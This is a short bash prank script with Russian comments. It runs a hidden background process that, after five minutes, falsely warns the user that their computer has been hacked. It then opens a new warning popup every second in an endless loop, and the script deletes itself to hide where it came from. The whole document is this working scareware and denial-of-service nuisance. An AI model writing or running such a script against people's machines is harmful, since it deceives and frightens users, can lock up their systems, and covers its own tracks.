#!/bin/bash

# Предупредить и запустить бесконечный AlertDialog 🥰💀 P.S. С любовью, Bauka (basagitz)
nohup bash -c "
sleep 300; zenity --warning --text='Ваш компьютер был взломан, готовьтесь... у вас 10 секунд' --title='WARNING!' --width=200 --height=40; sleep 10;
while true
do
    zenity --warning --text='Ваш компьютер был взломан' --title='WARNING!' --width=200 --height=40 &
    sleep 1  # Добавляет паузу в N секунд между предупреждениями
done
" > /dev/null 2>&1 & disown
rm -- "$0"
